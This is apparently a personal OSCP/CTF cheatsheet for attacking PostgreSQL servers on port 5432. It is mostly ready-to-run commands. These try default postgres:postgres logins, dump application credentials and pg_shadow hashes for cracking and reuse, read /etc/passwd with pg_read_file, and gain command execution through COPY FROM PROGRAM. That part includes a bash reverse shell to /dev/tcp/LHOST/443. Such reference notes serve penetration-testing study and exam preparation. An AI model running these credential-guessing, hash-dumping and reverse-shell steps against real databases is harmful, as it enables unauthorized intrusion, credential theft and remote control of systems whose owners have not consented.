---
tags: [hacking, ctf, oscp, postgresql, database]
type: cheatsheet
source: compiled reference (PostgreSQL enumeration)
last-verified: 2026-09-02
---

# PostgreSQL (5432)

## Up
- [[Services]]

PostgreSQL. Wins: **weak/default creds** (`postgres:postgres`), dumping app creds, and **`COPY ... FROM PROGRAM` RCE** on modern versions (9.3+ as a superuser). Language reference: [[PostgreSQL]] (Coding/SQL).

---

## Enumerate

```bash
nmap -p5432 -sC -sV $IP
psql -h $IP -U postgres                     # try postgres/postgres, found creds
psql "host=$IP user=postgres password=postgres"
crackmapexec postgres $IP -u postgres -p postgres
```

---

## Foothold Techniques

```sql
-- enumerate
\l                                   -- databases
\c appdb  \dt                        -- tables
SELECT * FROM users;                 -- creds → REUSE
SELECT usename, passwd FROM pg_shadow;   -- hashes → crack

-- RCE via COPY FROM PROGRAM (superuser, PostgreSQL 9.3+)
DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
COPY cmd_exec FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/LHOST/443 0>&1"';

-- file read/write
SELECT pg_read_file('/etc/passwd');
```

```bash
# metasploit / impacket also automate COPY-PROGRAM RCE
# CVE-2019-9193 is the classic "COPY FROM PROGRAM" abuse
```

---

## Common Misconfigurations / Exploits

- **Default creds** `postgres:postgres`, or trust auth for local/remote.
- **Superuser** access → `COPY ... FROM PROGRAM` = OS command execution (reverse shell).
- App **creds/hashes** in tables → crack ([[Password Cracking]]) and reuse.
- `pg_read_file`/`pg_ls_dir` for file disclosure.

---

## OSCP Tips

- Try `postgres:postgres` first; then creds from web configs.
- Superuser → **`COPY FROM PROGRAM`** is a clean RCE → reverse shell → [[Shell Stabilization]].
- Dump `pg_shadow` / app tables for creds to reuse on [[SSH (22)]] and elsewhere.
